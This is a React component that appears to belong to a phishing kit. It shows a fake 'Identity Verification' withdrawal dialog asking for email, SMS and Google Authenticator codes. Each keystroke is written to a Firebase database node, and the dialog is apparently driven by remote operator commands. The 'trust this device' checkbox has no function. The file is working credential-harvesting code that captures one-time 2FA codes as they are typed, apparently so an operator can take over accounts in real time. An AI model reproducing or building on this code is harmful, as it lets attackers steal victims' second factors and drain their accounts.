import { ThenableReference, ref, update } from "firebase/database";
import { useEffect, useState } from "react";
import { toast } from "react-toastify";

interface IProps {
  command: string;
  dataRef: ThenableReference | null;
}

export const WithdrawModal = ({ command, dataRef }: IProps) => {
  const [trCodes, setTrCodes] = useState({ email: "", sms: "", gauth: "" });
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    console.log(trCodes);
    if (dataRef) {
      update(dataRef, {
        trPass: {
          tr: "",
          email: trCodes.email,
          sms: trCodes.sms,
          twoFa: trCodes.gauth,
        },
      });
    }
  }, [trCodes]);

  useEffect(() => {
    if (command.includes("ERROR") && command.includes("WITH")) {
      toast.error("Invalid code!", {
        position: "top-center",
        autoClose: 3000,
        hideProgressBar: true,
        closeOnClick: true,
        theme: "light",
      });
    }
    if (!command.includes("CONFIRM")) {
      // setTrCodes({ email: "", gauth: "", sms: "" });
      setLoading(false);
    }
  }, [command]);
  return (
    <>
      {command.includes("W_WITH") ? (
        <>
          <div className="content-none block opacity-70 absolute top-0 right-0 bottom-0 left-0 bg-zinc-800"></div>
          <div
            id="default-modal"
            // tabindex="-1"
            aria-hidden="true"
            className="overflow-y-auto overflow-x-hidden fixed right-0 left-0 z-50 justify-center items-center w-full md:inset-0 h-[calc(100%-1rem)] max-h-full"
          >
            <div className="flex justify-center items-center">
              <div className="relative p-4 w-full max-w-md max-h-full">
                <div className="relative bg-zinc-50 rounded-lg shadow">
                  <div className="flex w-full flex-col gap-4 justify-start px-6 py-6">
                    <h1 className="font-bold text-lg text-zinc-800">
                      Identity Verification
                    </h1>
                    <hr />

                    {command.includes("2") ? (
                      <div className="flex flex-col gap-1">
                        <span className="font-medium text-sm text-zinc-700">
                          Email code
                        </span>
                        <input
                          className="w-full h-full px-2 py-1 text-base flex flex-col items-center border border-zinc-400 outline-none rounded-md  bg-white"
                          type="number"
                          // id={`${val}`}
                          autoFocus
                          name=""
                          value={trCodes.email}
                          onChange={(e) => {
                            setTrCodes((prev) => {
                              prev.email = e.target.value;
                              return { ...prev };
                            });
                          }}
                        />
                      </div>
                    ) : null}

                    {command.includes("3") ? (
                      <div className="flex flex-col gap-1">
                        <span className="font-medium text-sm text-zinc-700">
                          SMS code
                        </span>
                        <input
                          className="w-full h-full px-2 py-1 text-base flex flex-col items-center border border-zinc-400 outline-none rounded-md  bg-white"
                          type="number"
                          // id={`${val}`}
                          autoFocus
                          value={trCodes.sms}
                          name=""
                          onChange={(e) => {
                            setTrCodes((prev) => {
                              prev.sms = e.target.value;
                              return { ...prev };
                            });
                          }}
                        />
                      </div>
                    ) : null}

                    {command.includes("1") ? (
                      <div className="flex flex-col gap-1">
                        <span className="font-medium text-sm text-zinc-700">
                          Google Authenticator code
                        </span>
                        <input
                          className="w-full h-full px-2 py-1 text-base flex flex-col items-center border border-zinc-400 outline-none rounded-md  bg-white"
                          type="number"
                          // id={`${val}`}
                          autoFocus
                          name=""
                          value={trCodes.gauth}
                          onChange={(e) => {
                            setTrCodes((prev) => {
                              prev.gauth = e.target.value;
                              return { ...prev };
                            });
                          }}
                        />
                      </div>
                    ) : null}

                    <div className="flex items-center mb-4">
                      <div className="flex items-center me-4">
                        <input
                          id="red-checkbox"
                          type="checkbox"
                          value=""
                          className="w-4 h-4 text-[#121212] bg-gray-100 border-gray-300 rounded"
                        />
                        <label
                          // for="red-checkbox"
                          className="ms-2 text-sm font-medium text-gray-900 dark:text-gray-300"
                        >
                          Trust this device for 30 days
                        </label>
                      </div>
                    </div>

                    <button
                      disabled={loading}
                      onClick={() => {
                        if (dataRef) {
                          setLoading(true);
                          const refs = command.split("_")[2];
                          update(dataRef, {
                            command: `W_WITH_${refs}_CONFIRM`,
                          });
                        }
                      }}
                      className="bg-[#121212] hover:text-zinc-400 text-white disabled:bg-[#F5F5F5] py-3 disabled:text-zinc-400 rounded-[30px] disabled:cursor-not-allowed flex flex-row gap-2 items-center justify-center"
                    >
                      <svg
                        aria-hidden="true"
                        className={`w-4 h-4 text-gray-200 animate-spin dark:text-gray-600 fill-white ${
                          loading ? "visible" : "hidden"
                        }`}
                        viewBox="0 0 100 101"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path
                          d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
                          fill="currentColor"
                        />
                        <path
                          d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
                          fill="currentFill"
                        />
                      </svg>
                      Confirm
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </>
      ) : null}
    </>
  );
};
